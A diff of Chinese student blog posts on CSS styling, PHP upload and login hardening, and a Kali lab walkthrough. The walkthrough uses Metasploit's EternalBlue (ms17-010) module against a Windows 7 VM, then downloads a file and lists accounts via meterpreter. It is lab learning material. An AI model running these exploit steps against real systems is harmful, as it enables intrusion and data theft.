+      <a class="article-title" href="/2023/11/15/%E4%BC%98%E5%8C%96%E9%A1%B5%E9%9D%A2%E5%8F%8A%E6%96%87%E4%BB%B6%E4%BF%9D%E5%AF%86/">优化页面及文件保密</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="优化页面"><a href="#优化页面" class="headerlink" title="优化页面"></a>优化页面</h2><blockquote>
+<p>1.<strong>加背景图</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在&lt;style&gt;&lt;/style&gt;之间加入</span><br><span class="line">bady&#123;</span><br><span class="line">	background:url(&quot;图片的命名&quot;)；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注：图片要放到同意文件夹中，也就是www文件夹下。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231115154549975.png" alt="image-20231115154549975"></p>
+<p>效果为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231115154653469.png" alt="image-20231115154653469"></p>
+<p>2.<strong>实现文字框水平居中</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在&lt;style&gt;&lt;/style&gt;中间加入：</span><br><span class="line">		.center &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">        &#125;</span><br><span class="line">在&lt;body&gt;&lt;/body&gt;中间加入：</span><br><span class="line">&lt;div class=&quot;center&quot;&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">//文本</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">//对上面的.center进行引用。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231115155714005.png" alt="image-20231115155714005"></p>
+<p>3.<strong>使图片能够自动根据页面的大小和比例变化</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">background:url(&quot;tu.jpg&quot;);</span><br><span class="line">background-size: cover; /* or contain */</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="对上传的文件进行保密"><a href="#对上传的文件进行保密" class="headerlink" title="对上传的文件进行保密"></a>对上传的文件进行保密</h2><blockquote>
+<ul>
+<li>对文件名和文件位置进行加密</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在uploud.php文件中添加</span><br><span class="line">	// 生成随机的文件名</span><br><span class="line">    $random_name = time().uniqid() . &#x27;_&#x27; . $file_name;</span><br><span class="line">    // 移动文件到目标位置</span><br><span class="line">    $target_path = $upload_dir .&quot;\\&quot;. md5($random_name).$file_name;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231115160634932.png" alt="image-20231115160634932"></p>
+<ul>
+<li>进行参数绑定</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在link.php中加入：</span><br><span class="line">    // 使用预编译语句</span><br><span class="line">    $sql = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;;</span><br><span class="line">    $stmt = mysqli_prepare($link, $sql);</span><br><span class="line">    // 绑定参数</span><br><span class="line">    mysqli_stmt_bind_param($stmt, &quot;ss&quot;, $u, $p);</span><br><span class="line">    // 执行查询</span><br><span class="line">    mysqli_stmt_execute($stmt);</span><br><span class="line">    // 获取结果集</span><br><span class="line">    $result = mysqli_stmt_get_result($stmt);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231115161308846.png" alt="image-20231115161308846"></p>
+</blockquote>
+<p><strong>在主页加入注销</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;a href=&quot;?logout=true&quot;&gt;注销&lt;/a&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231115162425393.png" alt="image-20231115162425393"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231115162449961.png" alt="image-20231115162449961"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/15/%E4%BC%98%E5%8C%96%E9%A1%B5%E9%9D%A2%E5%8F%8A%E6%96%87%E4%BB%B6%E4%BF%9D%E5%AF%86/" data-id="clplzuha4000gq8u401n3ey02" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-php上传文件" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/14/php%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/" class="article-date">
+  <time class="post-time" datetime="2023-11-14T07:14:17.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br/>
+    <span class="post-day">14</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/11/14/php%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/">php上传文件</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="php上传文件"><a href="#php上传文件" class="headerlink" title="php上传文件"></a>php上传文件</h2><blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231114151518280.png" alt="image-20231114151518280"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231114151704303.png" alt="image-20231114151704303"></p>
+<p>[注]：目录最好不要有中文。</p>
+<ul>
+<li>需要新建一个名为upload的文件夹。存放在www文件夹下。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231114192444949.png" alt="image-20231114192444949"></p>
+<p>上传成功：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231114152243398.png" alt="image-20231114152243398"></p>
+<ul>
+<li>在zhuye.php中加入include ‘upload.php’;即可以引用upload.php页面。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231114191622658.png" alt="image-20231114191622658"></p>
+</blockquote>
+<h2 id="创建论坛区"><a href="#创建论坛区" class="headerlink" title="创建论坛区"></a>创建论坛区</h2><blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231114192150422.png" alt="image-20231114192150422"></p>
+<ul>
+<li>在zhuye.php中加入include ‘luntan.php’;即可以引用luntan.php页面。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//img/image-20231114193658173.png" alt="image-20231114193658173"></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/14/php%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/" data-id="clplzuha0000aq8u40ru7gf64" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-kali" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/10/kali/" class="article-date">
+  <time class="post-time" datetime="2023-11-10T06:18:27.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br/>
+    <span class="post-day">10</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/11/10/kali/">kali</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="网络安全–kali学习"><a href="#网络安全–kali学习" class="headerlink" title="网络安全–kali学习"></a>网络安全–kali学习</h2><blockquote>
+<p>1.<strong>安装</strong>：需要工具 Kali Linux 、 win7靶机  、虚拟机。</p>
+<p>2.<strong>查看win7和kali的IP地址</strong>：</p>
+<p>要保证win7和kali的网络适配在同一模式下。</p>
+<p>同时按住电脑win+r打开搜索框并输入cmd，回车，进入命令行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">win7输入ipconfig</span><br><span class="line">kali输入ifconfig</span><br></pre></td></tr></table></figure>
+
+<p>3.<strong>使用msf</strong>：</p>
+<ul>
+<li>进入管理员rool模式：输入 sudo su</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231110172548468.png" alt="image-20231110172548468"></p>
+<ul>
+<li><p>输入passwd root,修改root用户密码。注意：在输入密码时不会明文显示出来   </p>
+<p>​                                 <img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113194204637.png" alt="image-20231113194204637">                                                                  </p>
+</li>
+<li><p>通过ping命令，测试两台虚拟机是否能连通</p>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113194523245.png" alt="image-20231113194523245"></p>
+<p>[注意]：ping是会一直持续下去，按ctry+c停止。</p>
+<p>​            或可以用ping  -c 加要ping的次数 加win7的ip地址。</p>
+<ul>
+<li>kali-linux输入msfconsole启动msf。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113195146615.png" alt="image-20231113195146615"></p>
+<p>[注意]：每次启动时显示的图标都会不一样。</p>
+<p>4.<strong>查看漏洞模块</strong>：</p>
+<ul>
+<li>输入search ms17-010查看漏洞模块</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113195431679.png" alt="image-20231113195431679"></p>
+<p>5.<strong>扫描</strong>：</p>
+<ul>
+<li>使用use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010命令</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113195802311.png" alt="image-20231113195802311"></p>
+<ul>
+<li>设置被攻击的ip</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113195948702.png" alt="image-20231113195948702"></p>
+<ul>
+<li>输入show options查看参数</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113200111129.png" alt="image-20231113200111129"></p>
+<ul>
+<li>输入run执行</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113200215094.png" alt="image-20231113200215094"></p>
+<p>6.<strong>攻击</strong></p>
+<ul>
+<li>使用use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue命令进行攻击</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113200353834.png" alt="image-20231113200353834"></p>
+<ul>
+<li>然后输入exploit进行执行</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113201400736.png" alt="image-20231113201400736"></p>
+<ul>
+<li>显示远程主机系统信息：sysinfo</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113201701131.png" alt="image-20231113201701131"></p>
+<p>7.<strong>上传和下载</strong>：</p>
+<p>d &#x2F;home&#x2F;kali&#x2F;nyyxgvdS.jpeg c:&#x2F;windows&#x2F;temp<br>上传：upload+空格+要上传文件的具体路径+空格+上传到文件夹的具体路径<br>meterpreter &gt; download c:&#x2F;users&#x2F;administrator&#x2F;desktop&#x2F;666.txt &#x2F;home&#x2F;kali<br>下载：download+空格+要下载文件的具体路径+空格+下载到文件夹的具体路径</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231110155415637.png"></p>
+<p>8.<strong>获取win7的账后和密码</strong>：</p>
+<ul>
+<li>输入shell获取信息</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113202402700.png" alt="image-20231113202402700"></p>
+<ul>
+<li>输入net user</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231113202511752.png" alt="image-20231113202511752"></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/10/kali/" data-id="clplzuh9z0007q8u46zbq11hb" class="article-share-link">分享</a>
       
       
     </footer>
@@ -282,7 +1143,7 @@
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; pre</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
+    <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; pre</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/">next &amp;raquo;</a>
   </nav>
 </section>
         
@@ -323,7 +1184,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>53</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
